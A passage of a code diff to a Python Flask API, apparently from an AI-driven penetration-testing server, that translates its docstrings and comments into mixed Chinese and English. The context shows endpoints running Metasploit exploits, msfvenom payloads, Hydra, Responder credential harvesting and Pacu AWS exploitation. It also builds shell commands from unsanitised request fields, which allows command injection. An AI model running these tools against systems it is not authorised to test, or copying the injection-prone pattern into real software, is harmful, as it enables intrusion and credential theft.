+        # Use shell 命令 使用 pipe 用于 httpx
         cmd = f"echo {target} | httpx {additional_args}"
 
         return execute_command(cmd)
@@ -9983,7 +9983,7 @@ def execute_httpx_scan(target, params):
         return {"success": False, "error": str(e)}
 
 def execute_wpscan_scan(target, params):
-    """Execute wpscan scan with optimized parameters"""
+    """执行 wpscan 扫描 使用 optimized 参数"""
     try:
         additional_args = params.get('additional_args', '--enumerate p,t,u')
         cmd_parts = ['wpscan', '--url', target]
@@ -9995,7 +9995,7 @@ def execute_wpscan_scan(target, params):
         return {"success": False, "error": str(e)}
 
 def execute_dirsearch_scan(target, params):
-    """Execute dirsearch scan with optimized parameters"""
+    """执行 dirsearch 扫描 使用 optimized 参数"""
     try:
         additional_args = params.get('additional_args', '')
         cmd_parts = ['dirsearch', '-u', target]
@@ -10007,7 +10007,7 @@ def execute_dirsearch_scan(target, params):
         return {"success": False, "error": str(e)}
 
 def execute_arjun_scan(target, params):
-    """Execute arjun scan with optimized parameters"""
+    """执行 arjun 扫描 使用 optimized 参数"""
     try:
         additional_args = params.get('additional_args', '')
         cmd_parts = ['arjun', '-u', target]
@@ -10019,7 +10019,7 @@ def execute_arjun_scan(target, params):
         return {"success": False, "error": str(e)}
 
 def execute_paramspider_scan(target, params):
-    """Execute paramspider scan with optimized parameters"""
+    """执行 paramspider 扫描 使用 optimized 参数"""
     try:
         additional_args = params.get('additional_args', '')
         cmd_parts = ['paramspider', '-d', target]
@@ -10031,7 +10031,7 @@ def execute_paramspider_scan(target, params):
         return {"success": False, "error": str(e)}
 
 def execute_dalfox_scan(target, params):
-    """Execute dalfox scan with optimized parameters"""
+    """执行 dalfox 扫描 使用 optimized 参数"""
     try:
         additional_args = params.get('additional_args', '')
         cmd_parts = ['dalfox', 'url', target]
@@ -10043,7 +10043,7 @@ def execute_dalfox_scan(target, params):
         return {"success": False, "error": str(e)}
 
 def execute_amass_scan(target, params):
-    """Execute amass scan with optimized parameters"""
+    """执行 amass 扫描 使用 optimized 参数"""
     try:
         additional_args = params.get('additional_args', '')
         cmd_parts = ['amass', 'enum', '-d', target]
@@ -10055,7 +10055,7 @@ def execute_amass_scan(target, params):
         return {"success": False, "error": str(e)}
 
 def execute_subfinder_scan(target, params):
-    """Execute subfinder scan with optimized parameters"""
+    """执行 subfinder 扫描 使用 optimized 参数"""
     try:
         additional_args = params.get('additional_args', '')
         cmd_parts = ['subfinder', '-d', target]
@@ -10068,7 +10068,7 @@ def execute_subfinder_scan(target, params):
 
 @app.route("/api/intelligence/technology-detection", methods=["POST"])
 def detect_technologies():
-    """Detect technologies and create technology-specific testing recommendations"""
+    """Detect technologies 与 创建 technology-specific 测试 recommendations"""
     try:
         data = request.get_json()
         if not data or 'target' not in data:
@@ -10078,10 +10078,10 @@ def detect_technologies():
 
         logger.info(f" Detecting technologies for {target}")
 
-        # Analyze target
+        # 分析 目标
         profile = decision_engine.analyze_target(target)
 
-        # Get technology-specific recommendations
+        # 获取 technology-specific recommendations
         tech_recommendations = {}
         for tech in profile.technologies:
             if tech == TechnologyStack.WORDPRESS:
@@ -10120,12 +10120,12 @@ def detect_technologies():
         return jsonify({"error": f"Server error: {str(e)}"}), 500
 
 # ============================================================================
-# BUG BOUNTY HUNTING WORKFLOW API ENDPOINTS
+# BUG BOUNTY HUNTING WORKFLOW API 端点
 # ============================================================================
 
 @app.route("/api/bugbounty/reconnaissance-workflow", methods=["POST"])
 def create_reconnaissance_workflow():
-    """Create comprehensive reconnaissance workflow for bug bounty hunting"""
+    """创建 综合 侦察 workflow 用于 bug bounty hunting"""
     try:
         data = request.get_json()
         if not data or 'domain' not in data:
@@ -10138,7 +10138,7 @@ def create_reconnaissance_workflow():
 
         logger.info(f" Creating reconnaissance workflow for {domain}")
 
-        # Create bug bounty target
+        # 创建 bug bounty 目标
         target = BugBountyTarget(
             domain=domain,
             scope=scope,
@@ -10146,7 +10146,7 @@ def create_reconnaissance_workflow():
             program_type=program_type
         )
 
-        # Generate reconnaissance workflow
+        # 生成 侦察 workflow
         workflow = bugbounty_manager.create_reconnaissance_workflow(target)
 
         logger.info(f" Reconnaissance workflow created for {domain}")
@@ -10163,7 +10163,7 @@ def create_reconnaissance_workflow():
 
 @app.route("/api/bugbounty/vulnerability-hunting-workflow", methods=["POST"])
 def create_vulnerability_hunting_workflow():
-    """Create vulnerability hunting workflow prioritized by impact"""
+    """创建 漏洞 hunting workflow prioritized 由 impact"""
     try:
         data = request.get_json()
         if not data or 'domain' not in data:
@@ -10175,14 +10175,14 @@ def create_vulnerability_hunting_workflow():
 
         logger.info(f" Creating vulnerability hunting workflow for {domain}")
 
-        # Create bug bounty target
+        # 创建 bug bounty 目标
         target = BugBountyTarget(
             domain=domain,
             priority_vulns=priority_vulns,
             bounty_range=bounty_range
         )
 
-        # Generate vulnerability hunting workflow
+        # 生成 漏洞 hunting workflow
         workflow = bugbounty_manager.create_vulnerability_hunting_workflow(target)
 
         logger.info(f" Vulnerability hunting workflow created for {domain}")
@@ -10199,7 +10199,7 @@ def create_vulnerability_hunting_workflow():
 
 @app.route("/api/bugbounty/business-logic-workflow", methods=["POST"])
 def create_business_logic_workflow():
-    """Create business logic testing workflow"""
+    """创建 business logic 测试 workflow"""
     try:
         data = request.get_json()
         if not data or 'domain' not in data:
@@ -10210,10 +10210,10 @@ def create_business_logic_workflow():
 
         logger.info(f" Creating business logic testing workflow for {domain}")
 
-        # Create bug bounty target
+        # 创建 bug bounty 目标
         target = BugBountyTarget(domain=domain, program_type=program_type)
 
-        # Generate business logic testing workflow
+        # 生成 business logic 测试 workflow
         workflow = bugbounty_manager.create_business_logic_testing_workflow(target)
 
         logger.info(f" Business logic testing workflow created for {domain}")
@@ -10230,7 +10230,7 @@ def create_business_logic_workflow():
 
 @app.route("/api/bugbounty/osint-workflow", methods=["POST"])
 def create_osint_workflow():
-    """Create OSINT gathering workflow"""
+    """创建 OSINT gathering workflow"""
     try:
         data = request.get_json()
         if not data or 'domain' not in data:
@@ -10240,10 +10240,10 @@ def create_osint_workflow():
 
         logger.info(f" Creating OSINT workflow for {domain}")
 
-        # Create bug bounty target
+        # 创建 bug bounty 目标
         target = BugBountyTarget(domain=domain)
 
-        # Generate OSINT workflow
+        # 生成 OSINT workflow
         workflow = bugbounty_manager.create_osint_workflow(target)
 
         logger.info(f" OSINT workflow created for {domain}")
@@ -10260,7 +10260,7 @@ def create_osint_workflow():
 
 @app.route("/api/bugbounty/file-upload-testing", methods=["POST"])
 def create_file_upload_testing():
-    """Create file upload vulnerability testing workflow"""
+    """创建 文件 upload 漏洞 测试 workflow"""
     try:
         data = request.get_json()
         if not data or 'target_url' not in data:
@@ -10270,10 +10270,10 @@ def create_file_upload_testing():
 
         logger.info(f" Creating file upload testing workflow for {target_url}")
 
-        # Generate file upload testing workflow
+        # 生成 文件 upload 测试 workflow
         workflow = fileupload_framework.create_upload_testing_workflow(target_url)
 
-        # Generate test files
+        # 生成 测试 文件
         test_files = fileupload_framework.generate_test_files()
         workflow["test_files"] = test_files
 
@@ -10291,7 +10291,7 @@ def create_file_upload_testing():
 
 @app.route("/api/bugbounty/comprehensive-assessment", methods=["POST"])
 def create_comprehensive_bugbounty_assessment():
-    """Create comprehensive bug bounty assessment combining all workflows"""
+    """创建 综合 bug bounty assessment combining 全部 workflows"""
     try:
         data = request.get_json()
         if not data or 'domain' not in data:
@@ -10305,14 +10305,14 @@ def create_comprehensive_bugbounty_assessment():
 
         logger.info(f" Creating comprehensive bug bounty assessment for {domain}")
 
-        # Create bug bounty target
+        # 创建 bug bounty 目标
         target = BugBountyTarget(
             domain=domain,
             scope=scope,
             priority_vulns=priority_vulns
         )
 
-        # Generate all workflows
+        # 生成 全部 workflows
         assessment = {
             "target": domain,
             "reconnaissance": bugbounty_manager.create_reconnaissance_workflow(target),
@@ -10325,7 +10325,7 @@ def create_comprehensive_bugbounty_assessment():
         if include_business_logic:
             assessment["business_logic"] = bugbounty_manager.create_business_logic_testing_workflow(target)
 
-        # Calculate total estimates
+        # 计算 total estimates
         total_time = sum(workflow.get("estimated_time", 0) for workflow in assessment.values() if isinstance(workflow, dict))
         total_tools = sum(workflow.get("tools_count", 0) for workflow in assessment.values() if isinstance(workflow, dict))
 
@@ -10349,12 +10349,12 @@ def create_comprehensive_bugbounty_assessment():
         return jsonify({"error": f"Server error: {str(e)}"}), 500
 
 # ============================================================================
-# SECURITY TOOLS API ENDPOINTS
+# 安全 工具 API 端点
 # ============================================================================
 
 @app.route("/api/tools/nmap", methods=["POST"])
 def nmap():
-    """Execute nmap scan with enhanced logging, caching, and intelligent error handling"""
+    """执行 nmap 扫描 使用 增强日志, caching, 与 智能 错误 handling"""
     try:
         params = request.json
         target = params.get("target", "")
@@ -10381,7 +10381,7 @@ def nmap():
 
         logger.info(f" Starting Nmap scan: {target}")
 
-        # Use intelligent error handling if enabled
+        # Use 智能 错误 handling 如果 enabled
         if use_recovery:
             tool_params = {
                 "target": target,
@@ -10404,7 +10404,7 @@ def nmap():
 
 @app.route("/api/tools/gobuster", methods=["POST"])
 def gobuster():
-    """Execute gobuster with enhanced logging and intelligent error handling"""
+    """执行 gobuster 使用 增强日志 与 智能 错误 handling"""
     try:
         params = request.json
         url = params.get("url", "")
@@ -10419,7 +10419,7 @@ def gobuster():
                 "error": "URL parameter is required"
             }), 400
 
-        # Validate mode
+        # 校验 模式
         if mode not in ["dir", "dns", "fuzz", "vhost"]:
             logger.warning(f" Invalid gobuster mode: {mode}")
             return jsonify({
@@ -10433,7 +10433,7 @@ def gobuster():
 
         logger.info(f" Starting Gobuster {mode} scan: {url}")
 
-        # Use intelligent error handling if enabled
+        # Use 智能 错误 handling 如果 enabled
         if use_recovery:
             tool_params = {
                 "target": url,
@@ -10456,7 +10456,7 @@ def gobuster():
 
 @app.route("/api/tools/nuclei", methods=["POST"])
 def nuclei():
-    """Execute Nuclei vulnerability scanner with enhanced logging and intelligent error handling"""
+    """执行 Nuclei 漏洞 scanner 使用 增强日志 与 智能 错误 handling"""
     try:
         params = request.json
         target = params.get("target", "")
@@ -10488,7 +10488,7 @@ def nuclei():
 
         logger.info(f" Starting Nuclei vulnerability scan: {target}")
 
-        # Use intelligent error handling if enabled
+        # Use 智能 错误 handling 如果 enabled
         if use_recovery:
             tool_params = {
                 "target": target,
@@ -10511,12 +10511,12 @@ def nuclei():
         }), 500
 
 # ============================================================================
-# CLOUD SECURITY TOOLS
+# 云 安全 工具
 # ============================================================================
 
 @app.route("/api/tools/prowler", methods=["POST"])
 def prowler():
-    """Execute Prowler for AWS security assessment"""
+    """执行 Prowler 用于 AWS 安全 assessment"""
     try:
         params = request.json
         provider = params.get("provider", "aws")
@@ -10527,7 +10527,7 @@ def prowler():
         output_format = params.get("output_format", "json")
         additional_args = params.get("additional_args", "")
 
-        # Ensure output directory exists
+        # Ensure 输出 目录 exists
         Path(output_dir).mkdir(parents=True, exist_ok=True)
 
         command = f"prowler {provider}"
@@ -10560,10 +10560,10 @@ def prowler():
 
 @app.route("/api/tools/trivy", methods=["POST"])
 def trivy():
-    """Execute Trivy for container/filesystem vulnerability scanning"""
+    """执行 Trivy 用于 容器/filesystem 漏洞 扫描"""
     try:
         params = request.json
-        scan_type = params.get("scan_type", "image")  # image, fs, repo
+        scan_type = params.get("scan_type", "image")  # 说明：image, fs, repo
         target = params.get("target", "")
         output_format = params.get("output_format", "json")
         severity = params.get("severity", "")
@@ -10603,22 +10603,22 @@ def trivy():
         }), 500
 
 # ============================================================================
-# ENHANCED CLOUD AND CONTAINER SECURITY TOOLS (v6.0)
+# 增强 云 与 容器 安全 工具 (v6.0)
 # ============================================================================
 
 @app.route("/api/tools/scout-suite", methods=["POST"])
 def scout_suite():
-    """Execute Scout Suite for multi-cloud security assessment"""
+    """执行 Scout Suite 用于 multi-云 安全 assessment"""
     try:
         params = request.json
-        provider = params.get("provider", "aws")  # aws, azure, gcp, aliyun, oci
+        provider = params.get("provider", "aws")  # 说明：aws, azure, gcp, aliyun, oci
         profile = params.get("profile", "default")
         report_dir = params.get("report_dir", "/tmp/scout-suite")
         services = params.get("services", "")
         exceptions = params.get("exceptions", "")
         additional_args = params.get("additional_args", "")
 
-        # Ensure report directory exists
+        # Ensure report 目录 exists
         Path(report_dir).mkdir(parents=True, exist_ok=True)
 
         command = f"scout {provider}"
@@ -10648,10 +10648,10 @@ def scout_suite():
 
 @app.route("/api/tools/cloudmapper", methods=["POST"])
 def cloudmapper():
-    """Execute CloudMapper for AWS network visualization and security analysis"""
+    """执行 CloudMapper 用于 AWS 网络 visualization 与 安全 分析"""
     try:
         params = request.json
-        action = params.get("action", "collect")  # collect, prepare, webserver, find_admins, etc.
+        action = params.get("action", "collect")  # 收集, prepare, webserver, find_admins, etc.
         account = params.get("account", "")
         config = params.get("config", "config.json")
         additional_args = params.get("additional_args", "")
@@ -10681,7 +10681,7 @@ def cloudmapper():
 
 @app.route("/api/tools/pacu", methods=["POST"])
 def pacu():
-    """Execute Pacu for AWS exploitation framework"""
+    """执行 Pacu 用于 AWS exploitation 框架"""
     try:
         params = request.json
         session_name = params.get("session_name", "hexstrike_session")
@@ -10690,7 +10690,7 @@ def pacu():
         regions = params.get("regions", "")
         additional_args = params.get("additional_args", "")
 
-        # Create Pacu command sequence
+        # 创建 Pacu 命令 sequence
         commands = []
         commands.append(f"set_session {session_name}")
 
@@ -10706,7 +10706,7 @@ def pacu():
 
         commands.append("exit")
 
-        # Create command file
+        # 创建 命令 文件
         command_file = "/tmp/pacu_commands.txt"
         with open(command_file, "w") as f:
             f.write("\n".join(commands))
@@ -10719,7 +10719,7 @@ def pacu():
         logger.info(f"  Starting Pacu AWS exploitation")
         result = execute_command(command)
 
-        # Cleanup
+        # 说明：Cleanup
         try:
             os.remove(command_file)
         except:
@@ -10733,7 +10733,7 @@ def pacu():
 
 @app.route("/api/tools/kube-hunter", methods=["POST"])
 def kube_hunter():
-    """Execute kube-hunter for Kubernetes penetration testing"""
+    """执行 kube-hunter 用于 Kubernetes penetration 测试"""
     try:
         params = request.json
         target = params.get("target", "")
@@ -10755,7 +10755,7 @@ def kube_hunter():
         elif interface:
             command += f" --interface {interface}"
         else:
-            # Default to pod scanning
+            # 默认 到 pod 扫描
             command += " --pod"
 
         if active:
@@ -10777,10 +10777,10 @@ def kube_hunter():
 
 @app.route("/api/tools/kube-bench", methods=["POST"])
 def kube_bench():
-    """Execute kube-bench for CIS Kubernetes benchmark checks"""
+    """执行 kube-bench 用于 CIS Kubernetes benchmark checks"""
     try:
         params = request.json
-        targets = params.get("targets", "")  # master, node, etcd, policies
+        targets = params.get("targets", "")  # 说明：master, node, etcd, policies
         version = params.get("version", "")
         config_dir = params.get("config_dir", "")
         output_format = params.get("output_format", "json")
@@ -10813,11 +10813,11 @@ def kube_bench():
 
 @app.route("/api/tools/docker-bench-security", methods=["POST"])
 def docker_bench_security():
-    """Execute Docker Bench for Security for Docker security assessment"""
+    """执行 Docker Bench 用于 安全 用于 Docker 安全 assessment"""
     try:
         params = request.json
-        checks = params.get("checks", "")  # Specific checks to run
-        exclude = params.get("exclude", "")  # Checks to exclude
+        checks = params.get("checks", "")  # Specific checks 到 run
+        exclude = params.get("exclude", "")  # Checks 到 exclude
         output_file = params.get("output_file", "/tmp/docker-bench-results.json")
         additional_args = params.get("additional_args", "")
 
@@ -10846,7 +10846,7 @@ def docker_bench_security():
 
 @app.route("/api/tools/clair", methods=["POST"])
 def clair():
-    """Execute Clair for container vulnerability analysis"""
+    """执行 Clair 用于 容器 漏洞 分析"""
     try:
         params = request.json
         image = params.get("image", "")
@@ -10858,7 +10858,7 @@ def clair():
             logger.warning(" Clair called without image parameter")
             return jsonify({"error": "Image parameter is required"}), 400
 
-        # Use clairctl for scanning
+        # Use clairctl 用于 扫描
         command = f"clairctl analyze {image}"
 
         if config:
@@ -10880,13 +10880,13 @@ def clair():
 
 @app.route("/api/tools/falco", methods=["POST"])
 def falco():
-    """Execute Falco for runtime security monitoring"""
+    """执行 Falco 用于 runtime 安全 监控"""
     try:
         params = request.json
         config_file = params.get("config_file", "/etc/falco/falco.yaml")
         rules_file = params.get("rules_file", "")
         output_format = params.get("output_format", "json")
-        duration = params.get("duration", 60)  # seconds
+        duration = params.get("duration", 60)  # 说明：seconds
         additional_args = params.get("additional_args", "")
 
         command = f"timeout {duration} falco"
@@ -10913,11 +10913,11 @@ def falco():
 
 @app.route("/api/tools/checkov", methods=["POST"])
 def checkov():
-    """Execute Checkov for infrastructure as code security scanning"""
+    """执行 Checkov 用于 infrastructure as code 安全 扫描"""
     try:
         params = request.json
         directory = params.get("directory", ".")
-        framework = params.get("framework", "")  # terraform, cloudformation, kubernetes, etc.
+        framework = params.get("framework", "")  # 说明：terraform, cloudformation, kubernetes, etc.
         check = params.get("check", "")
         skip_check = params.get("skip_check", "")
         output_format = params.get("output_format", "json")
@@ -10950,10 +10950,10 @@ def checkov():
 
 @app.route("/api/tools/terrascan", methods=["POST"])
 def terrascan():
-    """Execute Terrascan for infrastructure as code security scanning"""
+    """执行 Terrascan 用于 infrastructure as code 安全 扫描"""
     try:
         params = request.json
-        scan_type = params.get("scan_type", "all")  # all, terraform, k8s, etc.
+        scan_type = params.get("scan_type", "all")  # 全部, terraform, k8s, etc.
         iac_dir = params.get("iac_dir", ".")
         policy_type = params.get("policy_type", "")
         output_format = params.get("output_format", "json")
@@ -10984,7 +10984,7 @@ def terrascan():
 
 @app.route("/api/tools/dirb", methods=["POST"])
 def dirb():
-    """Execute dirb with enhanced logging"""
+    """执行 dirb 使用 增强日志"""
     try:
         params = request.json
         url = params.get("url", "")
@@ -11014,7 +11014,7 @@ def dirb():
 
 @app.route("/api/tools/nikto", methods=["POST"])
 def nikto():
-    """Execute nikto with enhanced logging"""
+    """执行 nikto 使用 增强日志"""
     try:
         params = request.json
         target = params.get("target", "")
@@ -11043,7 +11043,7 @@ def nikto():
 
 @app.route("/api/tools/sqlmap", methods=["POST"])
 def sqlmap():
-    """Execute sqlmap with enhanced logging"""
+    """执行 sqlmap 使用 增强日志"""
     try:
         params = request.json
         url = params.get("url", "")
@@ -11076,7 +11076,7 @@ def sqlmap():
 
 @app.route("/api/tools/metasploit", methods=["POST"])
 def metasploit():
-    """Execute metasploit module with enhanced logging"""
+    """执行 metasploit module 使用 增强日志"""
     try:
         params = request.json
         module = params.get("module", "")
@@ -11088,13 +11088,13 @@ def metasploit():
                 "error": "Module parameter is required"
             }), 400
 
-        # Create an MSF resource script
+        # 创建 an MSF resource script
         resource_content = f"use {module}\n"
         for key, value in options.items():
             resource_content += f"set {key} {value}\n"
         resource_content += "exploit\n"
 
-        # Save resource script to a temporary file
+        # Save resource script 到 a temporary 文件
         resource_file = "/tmp/mcp_msf_resource.rc"
         with open(resource_file, "w") as f:
             f.write(resource_content)
@@ -11104,7 +11104,7 @@ def metasploit():
         logger.info(f" Starting Metasploit module: {module}")
         result = execute_command(command)
 
-        # Clean up the temporary file
+        # Clean up the temporary 文件
         try:
             os.remove(resource_file)
         except Exception as e:
@@ -11120,7 +11120,7 @@ def metasploit():
 
 @app.route("/api/tools/hydra", methods=["POST"])
 def hydra():
-    """Execute hydra with enhanced logging"""
+    """执行 hydra 使用 增强日志"""
     try:
         params = request.json
         target = params.get("target", "")
@@ -11172,7 +11172,7 @@ def hydra():
 
 @app.route("/api/tools/john", methods=["POST"])
 def john():
-    """Execute john with enhanced logging"""
+    """执行 john 使用 增强日志"""
     try:
         params = request.json
         hash_file = params.get("hash_file", "")
@@ -11211,7 +11211,7 @@ def john():
 
 @app.route("/api/tools/wpscan", methods=["POST"])
 def wpscan():
-    """Execute wpscan with enhanced logging"""
+    """执行 wpscan 使用 增强日志"""
     try:
         params = request.json
         url = params.get("url", "")
@@ -11240,7 +11240,7 @@ def wpscan():
 
 @app.route("/api/tools/enum4linux", methods=["POST"])
 def enum4linux():
-    """Execute enum4linux with enhanced logging"""
+    """执行 enum4linux 使用 增强日志"""
     try:
         params = request.json
         target = params.get("target", "")
@@ -11266,7 +11266,7 @@ def enum4linux():
 
 @app.route("/api/tools/ffuf", methods=["POST"])
 def ffuf():
-    """Execute FFuf web fuzzer with enhanced logging"""
+    """执行 FFuf web fuzzer 使用 增强日志"""
     try:
         params = request.json
         url = params.get("url", "")
@@ -11309,7 +11309,7 @@ def ffuf():
 
 @app.route("/api/tools/netexec", methods=["POST"])
 def netexec():
-    """Execute NetExec (formerly CrackMapExec) with enhanced logging"""
+    """执行 NetExec (formerly CrackMapExec) 使用 增强日志"""
     try:
         params = request.json
         target = params.get("target", "")
@@ -11355,7 +11355,7 @@ def netexec():
 
 @app.route("/api/tools/amass", methods=["POST"])
 def amass():
-    """Execute Amass for subdomain enumeration with enhanced logging"""
+    """执行 Amass 用于 subdomain enumeration 使用 增强日志"""
     try:
         params = request.json
         domain = params.get("domain", "")
@@ -11390,7 +11390,7 @@ def amass():
 
 @app.route("/api/tools/hashcat", methods=["POST"])
 def hashcat():
-    """Execute Hashcat for password cracking with enhanced logging"""
+    """执行 Hashcat 用于 password cracking 使用 增强日志"""
     try:
         params = request.json
         hash_file = params.get("hash_file", "")
@@ -11434,7 +11434,7 @@ def hashcat():
 
 @app.route("/api/tools/subfinder", methods=["POST"])
 def subfinder():
-    """Execute Subfinder for passive subdomain enumeration with enhanced logging"""
+    """执行 Subfinder 用于 passive subdomain enumeration 使用 增强日志"""
     try:
         params = request.json
         domain = params.get("domain", "")
@@ -11471,7 +11471,7 @@ def subfinder():
 
 @app.route("/api/tools/smbmap", methods=["POST"])
 def smbmap():
-    """Execute SMBMap for SMB share enumeration with enhanced logging"""
+    """执行 SMBMap 用于 SMB share enumeration 使用 增强日志"""
     try:
         params = request.json
         target = params.get("target", "")
@@ -11511,12 +11511,12 @@ def smbmap():
         }), 500
 
 # ============================================================================
-# ENHANCED NETWORK PENETRATION TESTING TOOLS (v6.0)
+# 增强 网络 PENETRATION 测试 工具 (v6.0)
 # ============================================================================
 
 @app.route("/api/tools/rustscan", methods=["POST"])
 def rustscan():
-    """Execute Rustscan for ultra-fast port scanning with enhanced logging"""
+    """执行 Rustscan 用于 ultra-fast port 扫描 使用 增强日志"""
     try:
         params = request.json
         target = params.get("target", "")
@@ -11552,7 +11552,7 @@ def rustscan():
 
 @app.route("/api/tools/masscan", methods=["POST"])
 def masscan():
-    """Execute Masscan for high-speed Internet-scale port scanning with intelligent rate limiting"""
+    """执行 Masscan 用于 high-speed Internet-scale port 扫描 使用 智能 rate limiting"""
     try:
         params = request.json
         target = params.get("target", "")
@@ -11595,7 +11595,7 @@ def masscan():
 
 @app.route("/api/tools/nmap-advanced", methods=["POST"])
 def nmap_advanced():
-    """Execute advanced Nmap scans with custom NSE scripts and optimized timing"""
+    """执行 高级 Nmap scans 使用 custom NSE scripts 与 optimized timing"""
     try:
         params = request.json
         target = params.get("target", "")
@@ -11634,7 +11634,7 @@ def nmap_advanced():
 
         if nse_scripts:
             command += f" --script={nse_scripts}"
-        elif not aggressive:  # Default useful scripts if not aggressive
+        elif not aggressive:  # 默认 useful scripts 如果 not aggressive
             command += " --script=default,discovery,safe"
 
         if additional_args:
@@ -11650,7 +11650,7 @@ def nmap_advanced():
 
 @app.route("/api/tools/autorecon", methods=["POST"])
 def autorecon():
-    """Execute AutoRecon for comprehensive automated reconnaissance"""
+    """执行 AutoRecon 用于 综合 automated 侦察"""
     try:
         params = request.json
         target = params.get("target", "")
@@ -11686,7 +11686,7 @@ def autorecon():
 
 @app.route("/api/tools/enum4linux-ng", methods=["POST"])
 def enum4linux_ng():
-    """Execute Enum4linux-ng for advanced SMB enumeration with enhanced logging"""
+    """执行 Enum4linux-ng 用于 高级 SMB enumeration 使用 增强日志"""
     try:
         params = request.json
         target = params.get("target", "")
@@ -11714,7 +11714,7 @@ def enum4linux_ng():
         if domain:
             command += f" -d {domain}"
 
-        # Add specific enumeration options
+        # 说明：Add specific enumeration options
         enum_options = []
         if shares:
             enum_options.append("S")
@@ -11741,7 +11741,7 @@ def enum4linux_ng():
 
 @app.route("/api/tools/rpcclient", methods=["POST"])
 def rpcclient():
-    """Execute rpcclient for RPC enumeration with enhanced logging"""
+    """执行 rpcclient 用于 RPC enumeration 使用 增强日志"""
     try:
         params = request.json
         target = params.get("target", "")
@@ -11755,19 +11755,19 @@ def rpcclient():
             logger.warning(" rpcclient called without target parameter")
             return jsonify({"error": "Target parameter is required"}), 400
 
-        # Build authentication string
+        # Build 认证 string
         auth_string = ""
         if username and password:
             auth_string = f"-U {username}%{password}"
         elif username:
             auth_string = f"-U {username}"
         else:
-            auth_string = "-U ''"  # Anonymous
+            auth_string = "-U ''"  # 说明：Anonymous
 
         if domain:
             auth_string += f" -W {domain}"
 
-        # Create command sequence
+        # 创建 命令 sequence
         command_sequence = commands.replace(";", "\n")
 
         command = f"echo -e '{command_sequence}' | rpcclient {auth_string} {target}"
@@ -11785,7 +11785,7 @@ def rpcclient():
 
 @app.route("/api/tools/nbtscan", methods=["POST"])
 def nbtscan():
-    """Execute nbtscan for NetBIOS name scanning with enhanced logging"""
+    """执行 nbtscan 用于 NetBIOS name 扫描 使用 增强日志"""
     try:
         params = request.json
         target = params.get("target", "")
@@ -11817,7 +11817,7 @@ def nbtscan():
 
 @app.route("/api/tools/arp-scan", methods=["POST"])
 def arp_scan():
-    """Execute arp-scan for network discovery with enhanced logging"""
+    """执行 arp-扫描 用于 网络 发现 使用 增强日志"""
     try:
         params = request.json
         target = params.get("target", "")
@@ -11854,7 +11854,7 @@ def arp_scan():
 
 @app.route("/api/tools/responder", methods=["POST"])
 def responder():
-    """Execute Responder for credential harvesting with enhanced logging"""
+    """执行 Responder 凭据采集，并启用增强日志。"""
     try:
         params = request.json
         interface = params.get("interface", "eth0")
@@ -11862,7 +11862,7 @@ def responder():
         wpad = params.get("wpad", True)
         force_wpad_auth = params.get("force_wpad_auth", False)
         fingerprint = params.get("fingerprint", False)
-        duration = params.get("duration", 300)  # 5 minutes default
+        duration = params.get("duration", 300)  # 默认 5 分钟
         additional_args = params.get("additional_args", "")
 
         if not interface:
@@ -11896,7 +11896,7 @@ def responder():
 
 @app.route("/api/tools/volatility", methods=["POST"])
 def volatility():
-    """Execute Volatility for memory forensics with enhanced logging"""
+    """执行 Volatility 用于 内存 取证 使用 增强日志"""
     try:
         params = request.json
         memory_file = params.get("memory_file", "")
@@ -11938,7 +11938,7 @@ def volatility():
 
 @app.route("/api/tools/msfvenom", methods=["POST"])
 def msfvenom():
-    """Execute MSFVenom to generate payloads with enhanced logging"""
+    """执行 MSFVenom 到 生成 payloads 使用 增强日志"""
     try:
         params = request.json
         payload = params.get("payload", "")
@@ -11982,12 +11982,12 @@ def msfvenom():
         }), 500
 
 # ============================================================================
-# BINARY ANALYSIS & REVERSE ENGINEERING TOOLS
+# 二进制 分析 & 逆向工程 工具
 # ============================================================================
 
 @app.route("/api/tools/gdb", methods=["POST"])
 def gdb():
-    """Execute GDB for binary analysis and debugging with enhanced logging"""
+    """执行 GDB 用于 二进制 分析 与 debugging 使用 增强日志"""
     try:
         params = request.json
         binary = params.get("binary", "")
@@ -12036,7 +12036,7 @@ def gdb():
 
 @app.route("/api/tools/radare2", methods=["POST"])
 def radare2():
-    """Execute Radare2 for binary analysis and reverse engineering with enhanced logging"""
+    """执行 Radare2 用于 二进制 分析 与 逆向工程 使用 增强日志"""
     try:
         params = request.json
         binary = params.get("binary", "")
@@ -12079,7 +12079,7 @@ def radare2():
 
 @app.route("/api/tools/binwalk", methods=["POST"])
 def binwalk():
-    """Execute Binwalk for firmware and file analysis with enhanced logging"""
+    """执行 Binwalk 用于 firmware 与 文件 分析 使用 增强日志"""
     try:
         params = request.json
         file_path = params.get("file_path", "")
@@ -12114,7 +12114,7 @@ def binwalk():
 
 @app.route("/api/tools/ropgadget", methods=["POST"])
 def ropgadget():
-    """Search for ROP gadgets in a binary using ROPgadget with enhanced logging"""
+    """Search 用于 ROP gadgets 在 a 二进制 using ROPgadget 使用 增强日志"""
     try:
         params = request.json
         binary = params.get("binary", "")
@@ -12147,7 +12147,7 @@ def ropgadget():
 
 @app.route("/api/tools/checksec", methods=["POST"])
 def checksec():
-    """Check security features of a binary with enhanced logging"""
+    """检查 安全 features 的 a 二进制 使用 增强日志"""
     try:
         params = request.json
         binary = params.get("binary", "")
@@ -12172,7 +12172,7 @@ def checksec():
 
 @app.route("/api/tools/xxd", methods=["POST"])
 def xxd():
-    """Create a hex dump of a file using xxd with enhanced logging"""
+    """创建 a hex dump 的 a 文件 using xxd 使用 增强日志"""
     try:
         params = request.json
         file_path = params.get("file_path", "")
@@ -12208,7 +12208,7 @@ def xxd():
 
 @app.route("/api/tools/strings", methods=["POST"])
 def strings():
-    """Extract strings from a binary file with enhanced logging"""
+    """Extract strings 来自 a 二进制 文件 使用 增强日志"""
     try:
         params = request.json
         file_path = params.get("file_path", "")
@@ -12240,7 +12240,7 @@ def strings():
 
 @app.route("/api/tools/objdump", methods=["POST"])
 def objdump():
-    """Analyze a binary using objdump with enhanced logging"""
+    """分析 a 二进制 using objdump 使用 增强日志"""
     try:
         params = request.json
         binary = params.get("binary", "")
@@ -12276,12 +12276,12 @@ def objdump():
         }), 500
 
 # ============================================================================
-# ENHANCED BINARY ANALYSIS AND EXPLOITATION FRAMEWORK (v6.0)
+# 增强 二进制 分析 与 EXPLOITATION 框架 (v6.0)
 # ============================================================================
 
 @app.route("/api/tools/ghidra", methods=["POST"])
 def ghidra():
-    """Execute Ghidra for advanced binary analysis and reverse engineering"""
+    """执行 Ghidra 用于 高级 二进制 分析 与 逆向工程"""
     try:
         params = request.json
         binary = params.get("binary", "")
@@ -12295,11 +12295,11 @@ def ghidra():
             logger.warning(" Ghidra called without binary parameter")
